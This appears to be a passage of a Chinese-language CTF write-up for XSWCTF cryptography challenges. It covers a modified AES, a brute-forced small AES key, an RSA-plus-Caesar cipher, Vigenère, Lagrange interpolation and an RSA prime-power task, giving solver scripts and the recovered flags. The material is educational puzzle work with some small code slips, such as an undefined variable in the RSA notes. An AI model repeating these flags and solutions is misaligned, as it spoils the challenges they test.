        0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2],
    [0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,
        0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73],
    [0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,
        0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb],
    [0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
        0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79],
    [0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,
        0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08],
    [0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,
        0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a],
    [0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
        0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e],
    [0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,
        0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf],
    [0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,
        0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16],
]

s_box_inv = [
    [0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38,
        0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb],
    [0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87,
        0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb],
    [0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d,
        0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e],
    [0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2,
        0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25],
    [0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16,
        0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92],
    [0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda,
        0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84],
    [0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a,
        0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06],
    [0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02,
        0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b],
    [0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea,
        0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73],
    [0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85,
        0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e],
    [0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89,
        0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b],
    [0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20,
        0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4],
    [0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31,
        0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f],
    [0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d,
        0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef],
    [0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0,
        0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61],
    [0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26,
        0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d],
]

def key_expansion(grid):
    # 密钥扩展
    for i in range(10 * 4):
        r = grid[-4:]
        if i % 4 == 0:
            for j, v in enumerate(r[1:] + r[:1]):
                r[j] = s_box[v >> 4][v & 0xf] ^ (rc[i // 4] if j == 0 else 0)
        for j in range(4):
            grid.append(grid[-16] ^ r[j])
    return grid

def add_round_key(b, round_key):
    # 轮密钥加
    for i in range(16):
        b[i] ^= round_key[i]

def inv_sub_bytes(b):
    # 逆字节替换
    for i in range(16):
        b[i] = s_box_inv[b[i] >> 4][b[i] & 0xf]

def inv_mix_columns(grid):
    # 逆列混淆
    def mul_by_2(n):
        return ((n << 1) ^ 0x1b) & 0xff if n & 0x80 else (n << 1) & 0xff
    
    def mul_by_3(n):
        return mul_by_2(n) ^ n
    
    def mul_by_9(n):
        return mul_by_2(mul_by_2(mul_by_2(n))) ^ n
    
    def mul_by_11(n):
        return mul_by_2(mul_by_2(mul_by_2(n))) ^ mul_by_2(n) ^ n
    
    def mul_by_13(n):
        return mul_by_2(mul_by_2(mul_by_2(n))) ^ mul_by_2(mul_by_2(n)) ^ n
    
    def mul_by_14(n):
        return mul_by_2(mul_by_2(mul_by_2(n))) ^ mul_by_2(mul_by_2(n)) ^ mul_by_2(n)
    
    for i in range(0, 16, 4):
        s0, s1, s2, s3 = grid[i:i+4]
        grid[i]   = mul_by_14(s0) ^ mul_by_11(s1) ^ mul_by_13(s2) ^ mul_by_9(s3)
        grid[i+1] = mul_by_9(s0) ^ mul_by_14(s1) ^ mul_by_11(s2) ^ mul_by_13(s3)
        grid[i+2] = mul_by_13(s0) ^ mul_by_9(s1) ^ mul_by_14(s2) ^ mul_by_11(s3)
        grid[i+3] = mul_by_11(s0) ^ mul_by_13(s1) ^ mul_by_9(s2) ^ mul_by_14(s3)

def decrypt_block(b, expanded_key):
    add_round_key(b, expanded_key[-16:])
    
    # 逆字节替换
    inv_sub_bytes(b)
    
    # 9-1轮
    for i in reversed(range(1, 10)):
        # 轮密钥加
        add_round_key(b, expanded_key[i * 16:])
        # 逆列混淆
        inv_mix_columns(b)
        # 逆字节替换
        inv_sub_bytes(b)
    
    # 初始轮密钥加
    add_round_key(b, expanded_key)
    return b

def aes_decrypt(key, ciphertext):
    # gogo解密
    expanded_key = key_expansion(bytearray(key))
    b = bytearray(ciphertext)
    
    for i in range(0, len(b), 16):
        block = b[i:i+16]
        decrypt_block(block, expanded_key)
        b[i:i+16] = block
    
    return b

# 已知的数据
key = b'Slightly different from the AES.'
ciphertext = b'\x8d\xf4\xf4I\x114\x9d\xfds\x81\xb9\xafM\xf2G\xc8\xc3\xe8\xad\xff\xd5?\x19\xbb\xfeA\xdd\xfd\xeb)P\xdeX\x9c\xeb+\xaf\x947\x04\xd1\x1bC\xb4\x0c \xc3\xe7\x91+\x1d\xd5\x92\x93\xd9\tN\xd3\xb1*a\xe8\x15;'

# 解密
plaintext = aes_decrypt(key, ciphertext)
print('解密结果：', plaintext)
# 规范一点
plaintext = plaintext.rstrip(b'\x00')
print('去除填充后：', plaintext.decode())
```

运行测试脚本试试

```cmd
C:\Users\probie\Desktop\writeup\Alice Enc>python payload.py
解密结果： bytearray(b'XSWCTF{435_15_1MpORTAN7_1n_5yMmeTRlc_eNcrYption}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
去除填充后： XSWCTF{435_15_1MpORTAN7_1n_5yMmeTRlc_eNcrYption}
```

**得到：**XSWCTF{435_15_1MpORTAN7_1n_5yMmeTRlc_eNcrYption}



### BruteForce

#### 解题过程

下载双击打开直接看到加密源码

```python
from Crypto.Util.number import getPrime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

with open("/home/ctf/flag", "r") as f:
    flag = f.read().strip()

N = getPrime(1024)
r = getPrime(25)
key = N % r
key = str(key).encode('utf-8')


def AES_encrypt(text, key):
    cipher = AES.new(key, AES.MODE_ECB)
    padded_text = pad(text, AES.block_size)
    cipher_text = cipher.encrypt(padded_text)
    return cipher_text


if __name__ == '__main__':
    cipher_text = AES_encrypt(flag.encode('utf-8'), pad(key, AES.block_size))
    print(cipher_text)

```

**分析：**

- 从`AES.MODE_ECB`可以看到这是标准的`AES-ECB`加密
- 然后密钥也很简单`key = N % r`这里的`n`和`r`是`x比特位素数`即`N、r∈(2**(x-1),2**x)`

然后我们直接连接容器获取一下参数

```cmd
C:\Users\probie>nc 127.0.0.1 5676
b'\x8c\x88\xb2vmA\x8d\x91\x8b\x1d^\xec\xf0\x88\xb0\x00)\xc9\x88(\x9e\xc2\xbe+\x85+Fu\xc2\x97A\x19XA \xad\x05+\x01\x95w1\xf6\xc3\x11\x0bJ\xf3'

C:\Users\probie>nc 127.0.0.1 5676
b'<\r\xe6\xf1\x9f\xf5\xfe\xb5\xbc\xb1\xf3o{C\xe0\xfb\x9eF\x0e#\x9f\xc4\x18\x18\xd7\xa9\x07\xb7\x08\xce\xb0\x17i\x8a\x9e\xac\xe0.\x92<\xd8\xd5\xc5\xa6eK\x9c\x04'

C:\Users\probie>nc 127.0.0.1 5676
b'\x9e%\x8e/gR\rL)2ww\xf9\xc1\xe5\xe6\xeb\xe4\xad\xcd\xff\x81\xceOn\xd8\xac\xebDn\xa8\x11\x0ei\x08@-\x12\x84\x91\x98\x88i\x96a\xf7\x15\xf3
```

随便拿一个来写脚本就可以了

简单写一个暴力脚本

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import multiprocessing

# 密文
ciphertext = b'\x8c\x88\xb2vmA\x8d\x91\x8b\x1d^\xec\xf0\x88\xb0\x00)\xc9\x88(\x9e\xc2\xbe+\x85+Fu\xc2\x97A\x19XA \xad\x05+\x01\x95w1\xf6\xc3\x11\x0bJ\xf3'

# 最大密钥值 (2^25)
max_key = 2**25

def brute_force_range(start, end, result_queue):
    for key_int in range(start, end):
        key_str = str(key_int).encode('utf-8')
        padded_key = pad(key_str, AES.block_size)
        try:
            # 我们也拿一个AES作为解密器
            cipher = AES.new(padded_key, AES.MODE_ECB)
            # 解密
            plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
            # 检查
            if all(32 <= c <= 126 for c in plaintext):
                result_queue.put((key_int, plaintext.decode('utf-8')))
                return
        except (ValueError, UnicodeDecodeError):
            # 填充错误或解码错误，跳过
            continue
    # 如果没有找到，放入None
    result_queue.put(None)

def main():
    # 压榨一下CPU
    num_cores = multiprocessing.cpu_count()
    print(f"使用{num_cores}个CPU正在被压榨")
    
    # 计算每个进程需要处理的密钥范围
    chunk_size = max_key // num_cores
    ranges = []
    for i in range(num_cores):
        start = i * chunk_size
        # 最后一个进程处理剩余的密钥
        end = max_key if i == num_cores - 1 else (i + 1) * chunk_size
        ranges.append((start, end))
    
    # 创建结果队列
    result_queue = multiprocessing.Queue()
    
    # 创建进程
    processes = []
    for start, end in ranges:
        p = multiprocessing.Process(target=brute_force_range, args=(start, end, result_queue))
        processes.append(p)
        p.start()
    
    # 等待结果
    for p in processes:
        result = result_queue.get()
        if result is not None:
            key_found, flag_found = result
            print(f"密钥: {key_found}")
            print(f"flag: {flag_found}")
            # 终止所有其他进程
            for p in processes:
                p.terminate()
            return
    
    print("未找到密钥")

if __name__ == "__main__":
    main()
```

运行一下解密脚本试试

```cmd
D:\Downloads>python BruteForce.py
使用32个CPU正在被压榨
密钥: 16499845
flag: XSWCTF{Ju5t_6RUTE_1ORC3_1orc33Ee}
```

**得到：**XSWCTF{Ju5t_6RUTE_1ORC3_1orc33Ee}



### CaesarCerydra

#### 解题过程

下载双击打开，直接看到加密源码

```python
from Crypto.Util.number import getPrime

with open("/home/ctf/flag", "r") as f:
    flag = f.read().strip()

p = getPrime(512)
q = getPrime(512)
r = getPrime(12)
n = p * q


def encrypt_flag(flag):
    ciphertext = ''
    offset = 33550336
    for index, ch in enumerate(flag):
        offset += pow(index, 2) + pow(r, (p * q - p - q + 2), n)

        if 'a' <= ch <= 'z':
            ch = chr((ord(ch) - ord('a') + offset) % 26 + ord('a'))

        elif 'A' <= ch <= 'Z':
            ch = chr((ord(ch) - ord('A') + offset) % 26 + ord('A'))

        ciphertext += ch
    return ciphertext


if __name__ == '__main__':
    print(f"encrypty_flag = {encrypt_flag(flag)}")

```

**解读：**

- 熟悉的符号，熟悉的格式，一眼看出这是`RSA+凯撒`

- 这里补充一下我写的RSA的加密解密，当笔记

  ```python
  # 加密
  from Crypto.Util.number import * # 这里是经典密码学的工具库，应该不会陌生
  from secret import m # 这里用import导入明文
  
  m = bytes_to_long(m) # 明文m，这里是字节流表达
  p = getPrime(512) # 第512位质数，这里是bit位，即质数p∈(2**511,2**512)，这里存在多解，确解可通过抓包获取
  q = getPrime(512) # 第512位质数，这里是bit位，即质数q∈(2**511,2**512)，这里存在多解，确解可通过抓包获取
  
  e = 65537 # 公钥e，一般都是小整数
  n = p*q # 模数n
  c = pow(m, e, n) # 密文c，这里等价于c=m**e%n
  ```

  ```python
  # 解密
  from Crypto.Util.number import * # 一样的经典密码学的工具库
  
  # 由加密过程和抓包得到的数据
  p = getPrime(512) # 质数p，这里替换成确解
  q = getPrime(512) # 质数q，这里替换成确解
  e = 65537 # 公钥e
  n = p*q # 模数n
  
  phi_n = (p-1)*(q-1) # φ(n) = (p-1)*(q-1)
  d = inverse(e, phi_n) # 私钥d直接调用逆模函数处理
  
  m = pow(c, d, n) # 解密得到明文m的字节流表达
  m = long_to_bytes(m_long) # 将字节流m转为字符串表示
  ```

有了这些我们直接先去获取一下数据看看

```cmd
C:\Users\probie>nc 127.0.0.1 5840
encrypty_flag = KFMAGQ{uBvw_DneI4E_WlQXcs_4Ng_1SU_bkXC3R_Wf0pyO}
```

很简单了直接写一个解密脚本

```python
encrypted_flag = "CPOUSU{iHtm_DfoK4Q_SzWVsa_4Xi_1WQ_hiNK3J_Yz0tuC}"
initial_offset = 33550336
initial_offset_mod26 = initial_offset % 26  # 14

# 预计算 sum_sq
max_length = len(encrypted_flag)
sum_sq = []
total = 0
for i in range(max_length):
    total += i ** 2
    sum_sq.append(total)

# 尝试所有 r mod 26
for r_mod26 in range(26):
    decrypted = []
    for k in range(max_length):
        ch = encrypted_flag[k]
        if 'a' <= ch <= 'z':
            # 计算总偏移量
            total_offset = (initial_offset_mod26 + sum_sq[k] + (k + 1) * r_mod26) % 26
            # 解密
            pos = ord(ch) - ord('a')
            original_pos = (pos - total_offset) % 26
            original_ch = chr(original_pos + ord('a'))
            decrypted.append(original_ch)
        elif 'A' <= ch <= 'Z':
            # 计算总偏移量
            total_offset = (initial_offset_mod26 + sum_sq[k] + (k + 1) * r_mod26) % 26
            # 解密
            pos = ord(ch) - ord('A')
            original_pos = (pos - total_offset) % 26
            original_ch = chr(original_pos + ord('A'))
            decrypted.append(original_ch)
        else:
            # 非字母字符不变
            decrypted.append(ch)

    decrypted_str = ''.join(decrypted)
    print(f"r_mod26={r_mod26}: {decrypted_str}")
```

运行一下解密脚本试试

```cmd
D:\Downloads>python CaesarCerydra.py
r_mod26=0: OAVSAD{kXgd_PezE4L_EbZIwa_4Vc_1SC_kiRX3V_Fk0ptR}
r_mod26=1: NYSOVX{cOws_CqkO4T_KgDLyb_4Tz_1MV_byGL3H_Pt0wzW}
r_mod26=2: MWPKQR{uFmh_PcvY4B_QlHOac_4Rw_1GO_soVZ3T_Zc0dfB}
r_mod26=3: LUMGLL{mWcw_CogI4J_WqLRcd_4Pt_1AH_jeKN3F_Jl0klG}
r_mod26=4: KSJCGF{eNsl_ParS4R_CvPUee_4Nq_1UA_auZB3R_Tu0rrL}
r_mod26=5: JQGYBZ{wEia_CmcC4Z_IaTXgf_4Ln_1OT_rkOP3D_Dd0yxQ}
r_mod26=6: IODUWT{oVyp_PynM4H_OfXAig_4Jk_1IM_iaDD3P_Nm0fdV}
r_mod26=7: HMAQRN{gMoe_CkyW4P_UkBDkh_4Hh_1CF_zqSR3B_Xv0mjA}
r_mod26=8: GKXMMH{yDet_PwjG4X_ApFGmi_4Fe_1WY_qgHF3N_He0tpF}
r_mod26=9: FIUIHB{qUui_CiuQ4F_GuJJoj_4Db_1QR_hwWT3Z_Rn0avK}
r_mod26=10: EGRECV{iLkx_PufA4N_MzNMqk_4By_1KK_ymLH3L_Bw0hbP}
r_mod26=11: DEOAXP{aCam_CgqK4V_SeRPsl_4Zv_1ED_pcAV3X_Lf0ohU}
r_mod26=12: CCLWSJ{sTqb_PsbU4D_YjVSum_4Xs_1YW_gsPJ3J_Vo0vnZ}
r_mod26=13: BAISND{kKgq_CemE4L_EoZVwn_4Vp_1SP_xiEX3V_Fx0ctE}
r_mod26=14: AYFOIX{cBwf_PqxO4T_KtDYyo_4Tm_1MI_oyTL3H_Pg0jzJ}
r_mod26=15: ZWCKDR{uSmu_CciY4B_QyHBap_4Rj_1GB_foIZ3T_Zp0qfO}
r_mod26=16: YUZGYL{mJcj_PotI4J_WdLEcq_4Pg_1AU_weXN3F_Jy0xlT}

# 手动高光
r_mod26=17: XSWCTF{eAsy_CaeS4R_CiPHer_4Nd_1UN_nuMB3R_Th0erY}
# 手动高光

r_mod26=18: WQTYOZ{wRin_PmpC4Z_InTKgs_4La_1OG_ekBP3D_Dq0lxD}
r_mod26=19: VOQUJT{oIyc_CyaM4H_OsXNit_4Jx_1IZ_vaQD3P_Nz0sdI}
r_mod26=20: UMNQEN{gZor_PklW4P_UxBQku_4Hu_1CS_mqFR3B_Xi0zjN}
r_mod26=21: TKKMZH{yQeg_CwwG4X_AcFTmv_4Fr_1WL_dgUF3N_Hr0gpS}
r_mod26=22: SIHIUB{qHuv_PihQ4F_GhJWow_4Do_1QE_uwJT3Z_Ra0nvX}
r_mod26=23: RGEEPV{iYkk_CusA4N_MmNZqx_4Bl_1KX_lmYH3L_Bj0ubC}
r_mod26=24: QEBAKP{aPaz_PgdK4V_SrRCsy_4Zi_1EQ_ccNV3X_Ls0bhH}
r_mod26=25: PCYWFJ{sGqo_CsoU4D_YwVFuz_4Xf_1YJ_tsCJ3J_Vb0inM}
```

我们取这一条

```cmd
r_mod26=17: XSWCTF{eAsy_CaeS4R_CiPHer_4Nd_1UN_nuMB3R_Th0erY}
```

**得到：**XSWCTF{eAsy_CaeS4R_CiPHer_4Nd_1UN_nuMB3R_Th0erY}



### Classic Cipher

#### 解题过程

下载双击打开，直接看到加密源码

```python
import string 
from Crypto.Util.number import bytes_to_long
from secret import key, prefix, suffix
table = string.ascii_lowercase

with open("/home/ctf/flag", "r") as f:
    flag = f.read().strip().encode()

def convert(num: int) -> str:
    chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    
    if num == 0:
        return "0"

    result = []
    while num > 0:
        num, r = divmod(num, 36)
        result.append(chars[r])
    return "".join(reversed(result))

def classic_encrypt(plaintext, key):
    plaintext = plaintext.lower()
    ks = []
    ciphertext = ''
    for item in key:
        ks.append(ord(item) - ord('a'))
    k = 0
    for i in range(len(plaintext)):
        if plaintext[i] not in string.ascii_letters:
            ciphertext += plaintext[i]
        else:
            ciphertext += chr((((ord(plaintext[i]) - ord('a')) + ks[k % len(ks)]) % 26) + ord('a'))
            k += 1
    return ciphertext
     

assert len(key) == 11
if __name__ == "__main__":
    plaintext = prefix + convert(bytes_to_long(flag)) + suffix
    ciphertext = classic_encrypt(plaintext, key)
    print("ciphertext:",ciphertext)



```

这里看不出这是什么加密，先连接容器获取数据看看

```cmd
C:\Users\probie>nc 127.0.0.1 1776
ciphertext: esnrr'w drlhw cwhl htvq. kvt aaohxw zq wfdkl kf amd zvft kgs pbpvg nwie xkow. lv krr cbnar livq jc bxfu tamejj vt iagew xf hrh dk gje mesov: fdxkp bxiw, ufohq udivovq, gcgh udoiw rqu zpjt yhhtj, vrihxyas, uetre oca kpeto, srzzta hkttxfhj, 47xmb187vhoco8kocxzcnfthw41siruigx0fu7hlce6tywudfmee0h0jr1x2f3cf9rmw2pbuz6uw6pu3fy8vbjfj3pay5t49tlii8q8xj1yy6pxb6aqzqbj8h, glsot iskdkctp, xnixw, priyheane iyugzbv, mwws, veiufhh, djwvr, ovwtvjm, sjd, ysi vfat plnagkv uvohlf, leitvudwcq zqmuyxv.
```

这有点像...

**分析：**

- 这有点像古典密码`维吉尼亚`这是一种多表替换密码
- 我们需要先找到正确的密钥，然后才能求解flag

这里请大模型来帮我们把密钥求出来先

```python
# 计算重合指数，计算密钥长度

import math

def index_of_coincidence(text):
    n = len(text)
    freq = [0] * 26
    for c in text:
        if c.isalpha():
            freq[ord(c) - ord('a')] += 1
    ic = sum(f * (f - 1) for f in freq) / (n * (n - 1))
    return ic

# 测试不同密钥长度
for possible_key_length in range(1, 20):
    segments = [[] for _ in range(possible_key_length)]
    for i, c in enumerate(ciphertext):
        segments[i % possible_key_length].append(c)
    avg_ic = sum(index_of_coincidence(seg) for seg in segments) / possible_key_length
    print(f"密钥长度 {possible_key_length}: 平均IC = {avg_ic:.4f}")
```

```python
# 卡方检验寻找密钥

import string
from collections import Counter

ENGLISH_FREQ = [0.08167, 0.01492, 0.02782, 0.04253, 0.12702, 0.02228, 0.02015, 0.06094, 0.06966, 0.00153, 0.00772, 0.04025, 0.02406, 0.06749, 0.07507, 0.01929, 0.00095, 0.05987, 0.06327, 0.09056, 0.02758, 0.00978, 0.02360, 0.00150, 0.01974, 0.00074]

def chi_square_test(text, shift):
    text = text.lower()
    freq = [0] * 26
    for c in text:
        if c.isalpha():
            freq[ord(c) - ord('a')] += 1
    n = len(text)
    chi_square = 0.0
    for i in range(26):
        observed = freq[(i + shift) % 26]
        expected = n * ENGLISH_FREQ[i]
        chi_square += (observed - expected) ** 2 / expected
    return chi_square

# 为每个位置找到最佳偏移
for segment_index in range(key_length):
    segment = ciphertext[segment_index::key_length]
    chi_squares = []
    for shift in range(26):
        chi = chi_square_test(segment, shift)
        chi_squares.append((chi, shift))
    # 按卡方值升序排序（卡方值越小，拟合度越高）
    chi_squares.sort()
    best_shifts = chi_squares[:3]  # 取前3个最佳移位
    print(f"位置 {segment_index + 1}: {[(shift, string.ascii_lowercase[shift]) for chi, shift in best_shifts]}")
```

最终得到密钥为：**xswaterdrop**

知道了这些以后

我们就可以来简单写个解密脚本了

```python
# 维吉尼亚解密函数 (直接复制粘贴)
def vigenere_decrypt(ciphertext, key):
    plaintext = ""
    key_length = len(key)
    for i, c in enumerate(ciphertext):
        if c.isalpha():
            shift = ord(key[i % key_length]) - ord('a')
            # 维吉尼亚解密: 明文 = (密文 - 移位) mod 26
            plaintext_index = (ord(c) - ord('a') - shift) % 26
            plaintext += string.ascii_lowercase[plaintext_index]
        else:
            plaintext += c
    return plaintext

# 36进制转字节函数
def base36_to_bytes(base36_str):
    number = int(base36_str, 36)
    # 将数字转换为字节
    bytes_length = (number.bit_length() + 7) // 8
    bytes_data = number.to_bytes(bytes_length, byteorder='big')
    return bytes_data

# 密钥
key = "xswaterdrop"

# 解密
plaintext = vigenere_decrypt(ciphertext, key)
print(f"解密后文本: {plaintext}")

# 提取flag部分
if ':' in plaintext:
    flag_part = plaintext.split(':')[1].strip()
    print(f"部分flag: {flag_part}")
    
    # 转换为36进制
    try:
        flag_bytes = base36_to_bytes(flag_part)
        print(f"转换后字节: {flag_bytes}")
        
        # 尝试解码为字符串
        try:
            flag = flag_bytes.decode()
            print(f"flag: {flag}")
        except UnicodeDecodeError:
            print("go error")
            reversed_flag_part = flag_part[::-1]
            reversed_flag_bytes = base36_to_bytes(reversed_flag_part)
            try:
                reversed_flag = reversed_flag_bytes.decode()
                print(f"反转字节: {reversed_flag_bytes}")
                print(f"反转Flag: {reversed_flag}")
            except UnicodeDecodeError:
                print("gogo error")
    except ValueError as e:
        print(f"gogogo error: {e}")
```

运行解密脚本得到flag

**得到：**XSWCTF{HOpe_V1geN3Re_Can_heLp_Y0U_Flnd_thE_W4y_to_CrYPT09r4phY!!_c1232634c352}



### Lagrange

#### 解题过程

下载双击打开，查看加密源码

```python
from Crypto.Util.number import *
import random

with open("/home/ctf/flag", "r") as f:
    flag = f.read().strip().encode()
    
assert len(flag) % 5 == 0

def f(x, coeff, p):
    res = 0
    for i in range(5):
        res = (res + coeff[i] * pow(x, i, p)) % p
    return res

if __name__ == "__main__":
    p = getPrime(128)

    coeff = []
    length = len(flag) // 5
    for i in range(5):
        coeff.append(bytes_to_long(flag[i*length:(i+1)*length]))

    xs = []
    cs = []
    for i in range(5):
        x = random.randint(1, p)
        xs.append(x)
        cs.append(f(x, coeff, p))

    print("p = ", p)
    print("xs = ", xs)
    print("cs = ", cs)

```

**分析：**

- 看到这句`length = len(flag) // 5`就可以猜测这是一道`多项式插值问题`

- 一个`n`次多项式可以被`n+1`个点唯一确定，这个知识点在**快速傅里叶变换**里面也有用到

- 转换成线性代数

  ```
  c0 + c1*x0 + c2*x0² + c3*x0³ + c4*x0⁴ ≡ c0 mod p
  c0 + c1*x1 + c2*x1² + c3*x1³ + c4*x1⁴ ≡ c1 mod p
  c0 + c1*x2 + c2*x2² + c3*x2³ + c4*x2⁴ ≡ c2 mod p
  c0 + c1*x3 + c2*x3² + c3*x3³ + c4*x3⁴ ≡ c3 mod p
  c0 + c1*x4 + c2*x4² + c3*x4³ + c4*x4⁴ ≡ c4 mod p
  ```

知道了这些后

我们先来连接容器获取一下数据

```cmd
C:\Users\probie>nc 127.0.0.1 12241
p =  304783512985245858612236857998106261399
xs =  [85658408888511196719319895222491652412, 160491892853927975667874387470733554400, 232568885919096223098337683122377143742, 244692987743844408676827706304115877396, 269700813582088177623690441803082195118]
cs =  [288880432481869708175120173038288772597, 250442134370908985974364055971124665613, 289351856392889845201710534925925624602, 180147634205012419110822088106163141637, 172379333068270521181416874262547034243]
```

先来简单写一个解密脚本

```python
from Crypto.Util.number import *

# 已知参数
p = 339535214773381391012868351835050934333
xs = [264511483586809486147181186858037780950, 253214032190929699216221618581332984907, 152715203496684455211755717954922612508, 1868660270883138504460535324700541805, 222352899489861695503376848806039361694]
cs = [334550866013325972236793485861253739465, 22375704775098860808573373551871574373, 107445676154337504898183543146801226959, 280775117659698653208822427637226282392, 210531363742069228813652754128275257222]

n = 5

# 构造增广矩阵
augmented = []
for i in range(n):
    x = xs[i]
    # 计算x^0, x^1, x^2, x^3, x^4 mod p
    row = [pow(x, j, p) for j in range(n)]
    row.append(cs[i])
    augmented.append(row)
```

没招了，让大模型来帮我改

```python
from Crypto.Util.number import *

# 题目给出的已知参数
p = 339535214773381391012868351835050934333
xs = [264511483586809486147181186858037780950, 253214032190929699216221618581332984907, 152715203496684455211755717954922612508, 1868660270883138504460535324700541805, 222352899489861695503376848806039361694]
cs = [334550866013325972236793485861253739465, 22375704775098860808573373551871574373, 107445676154337504898183543146801226959, 280775117659698653208822427637226282392, 210531363742069228813652754128275257222]

n = 5

# 构造增广矩阵
augmented = []
for i in range(n):
    x = xs[i]
    # 计算x^0, x^1, x^2, x^3, x^4 mod p
    row = [pow(x, j, p) for j in range(n)]
    row.append(cs[i])  # 加入结果
    augmented.append(row)

# 高斯消元
for i in range(n):
    # 找主元行
    pivot_row = i
    while pivot_row < n and augmented[pivot_row][i] == 0:
        pivot_row += 1
    if pivot_row == n:
        raise ValueError("无解")
    # 交换行
    augmented[i], augmented[pivot_row] = augmented[pivot_row], augmented[i]
    # 归一化主元行
    pivot = augmented[i][i]
    inv_pivot = pow(pivot, p-2, p)  # 费马小定理求逆元
    augmented[i] = [(val * inv_pivot) % p for val in augmented[i]]
    # 消元其他行
    for j in range(n):
        if j != i:
            factor = augmented[j][i]
            augmented[j] = [(augmented[j][k] - factor * augmented[i][k]) % p for k in range(n+1)]

# 提取系数
coeffs = [row[-1] for row in augmented]

# 转换回字节并拼接
flag = b''.join([long_to_bytes(coeff) for coeff in coeffs])
print("flag:", flag.decode())
```

运行解密脚本得到

```cmd
C:\Users\probie\Desktop\writeup\Lagrange>python solve.py
Flag: XSWCTF{N0w_YOu_kNOw_wh4t_i5_l46ran63_in73RpIat3!!}
```

**得到：**XSWCTF{N0w_YOu_kNOw_wh4t_i5_l46ran63_in73RpIat3!!}



### Loss N-3

#### 解密过程

下载双击打开，查看加密源码

```python
from Crypto.Util.number import *

with open("/home/ctf/flag", "r") as f:
    flag = f.read().strip()

m = bytes_to_long(flag)
p = getPrime(512)
P = pow(p, 3)
e = 0x10001
c = pow(m, e, P)

print("Here you are: ")
print(f"e = {e}")
print(f"p = {p}")
print(f"c = {c}")

```

**分析：**

- 这是典型的非对称加密`RSA`

- 再次(上面也有写过)拿出我的笔记

  ```python
  # 加密
  from Crypto.Util.number import * # 这里是经典密码学的工具库，应该不会陌生
  from secret import m # 这里用import导入明文
  
  m = bytes_to_long(m) # 明文m，这里是字节流表达
  p = getPrime(512) # 第512位质数，这里是bit位，即质数p∈(2**511,2**512)，这里存在多解，确解可通过抓包获取
  q = getPrime(512) # 第512位质数，这里是bit位，即质数q∈(2**511,2**512)，这里存在多解，确解可通过抓包获取
  
  e = 65537 # 公钥e，一般都是小整数
  n = p*q # 模数n
  c = pow(m, e, n) # 密文c，这里等价于c=m**e%n
  ```

  ```python
  # 解密
  from Crypto.Util.number import * # 一样的经典密码学的工具库
  
  # 由加密过程和抓包得到的数据
  p = getPrime(512) # 质数p，这里替换成确解
  q = getPrime(512) # 质数q，这里替换成确解
  e = 65537 # 公钥e
  n = p*q # 模数n
